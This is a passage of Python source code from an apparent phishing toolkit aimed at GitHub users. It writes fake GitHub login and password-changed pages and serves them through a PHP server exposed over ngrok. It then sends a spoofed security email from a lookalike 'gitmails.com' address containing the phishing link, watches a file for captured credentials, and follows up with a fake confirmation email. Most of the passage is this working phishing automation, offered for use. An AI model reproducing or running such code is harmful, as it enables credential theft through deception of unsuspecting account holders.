	with open('./WEBSERVER/pass_changed.html', 'w') as file:
	  file.write(filedata)


	filedata = str(Login_github)
	with open('./WEBSERVER/login.php', 'w') as file:
	  file.write(filedata)

	os.system('touch ./WEBSERVER/creds.txt')



	os.system('chmod -R 777 ./WEBSERVER/')
	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")
	time.sleep(3)
	display = Display(visible=0, size=(800, 600))
	display.start()
	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")
	time.sleep(5)
	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	display.stop()
	phishin_url = str(url_f)


	emaildata = str(Email_github)
	emaildata = emaildata.replace('[UNAME]',str(UNAME))
	emaildata = emaildata.replace('[EMAIL]',str(Email))
	emaildata = emaildata.replace('[LOC]',str(loc))
	emaildata = emaildata.replace('[PHISH]',str(phishin_url))



	from_email = str(random.choice(['security@gitmails.com','no-reply@gitmails.com']))

	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system('reset')
	banN()

	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on Uname: \033[0;94m"+str(UNAME)+"\033[0;37m #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")

	os.system('tail -f ./WEBSERVER/creds.txt')
	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")
	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")
	print("               Automatically Sending a Confirmation Email!!\n")

	emaildata = str(Email1_github)
	emaildata = emaildata.replace('[UNAME]', str(UNAME))

	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
	os.system("reset")
	ENDst()









def banN():
	print("""\033[01;32m\n                                 \033[1;31m.::^;. ,\n                                     \033[1;31m:;i   :i\n                                    \033[1;31m::i  :;i\n                              \033[1;31m..::i :;:i:;i\n                             \033[1;31m,i  :i::::::i\n                                 \033[1;31m;;::;;:;;\n                                 \033[1;34m: \033[01;32mo   \033[01;32mo \033[1;34m:\n                                 \033[1;34m;.  \033[01;32mn  \033[1;34m.;\n                                   \033[1;34m( \033[01;32mx \033[1;34m)\n                                    \033[1;34m^^^\n                                 \033[1;30m-[\033[0m@_DEF9\033[1;30m]\033[0m\n""")






def ENDst():
	os.system('clear')
	print(Green+"""\n        .'(   )\\.---.   )\\.---.     /(,-.    )\\.--.   )\\.---.     )\\.-. """)
	print(Green+"""    ,') \\  ) (   ,-._( (   ,-._(  ,' _   )  (   ._.' (   ,-._(  ,' ,-,_)""")
	print(Green+"""   (  /(/ /   \\  '-,    \\  '-,   (  '-' (    `-.`.    \\  '-,   (  .   _ """)
	print(Green+"""    )    (     ) ,-`     ) ,-`    )  _   )  ,_ (  \\    ) ,-`    ) '..' )""")
	print(Green+"""   (  .'\\ \\   (  ``-.   (  ``-.  (  '-' /  (  '.)  )  (  ``-.  (  ,   ( """)
	print(Green+"""    )/   )/    )..-.(    )..-.(   )/._.'    '._,_.'    )..-.(   )/'._.' """)
	print(Green+"""                                                                        """)
	print("                         "+Grey+"["+Green+"+"+Grey+"]"+Reset+" FOLLOW US ON: "+Grey+"["+Green+"+"+Grey+"]\n")
	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"GITHUB"+Grey+"]:"+Reset+" https://goo.gl/b1w5x1 ")
	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"TWITTER"+Grey+"]:"+Reset+" https://goo.gl/ooZC6H ")
	print(Grey+" ["+Green+"!"+Grey+"]-["+Green+"YOUTUBE"+Grey+"]:"+Reset+" https://goo.gl/YcqyuQ")
	print(Grey+" ["+Green+"+"+Grey+"]-["+Green+"Z-HACKER"+Grey+"]:"+Reset+" https://goo.gl/eHQMXC \n")
	print('                              '+Reset+'-'+Grey+'Stay Weeb'+Reset+'-\n')
	sys.exit(0)



if __name__ == "__main__":
    try:
        Menu()
    except KeyboardInterrupt:
        ENDst()
